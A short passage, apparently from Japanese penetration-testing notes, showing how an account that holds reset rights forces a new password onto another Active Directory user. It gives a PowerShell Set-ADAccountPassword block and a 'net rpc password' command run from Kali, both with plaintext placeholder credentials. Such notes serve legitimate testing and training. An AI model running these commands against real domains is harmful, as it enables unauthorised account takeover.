...
$SecPassword = ConvertTo-SecureString 'fromuser-pass' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('foo.corp\fromuser', $SecPassword)
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-ADAccountPassword -Identity 'touser' -NewPassword $UserPassword -Reset -Credential $Cred
```

kaliから実行する方法もある。

```sh
net rpc password "touser" "Password123!" -U 'fromuser'%'fromuser-pass' -I $TARGET -S "FOO.CORP"
```
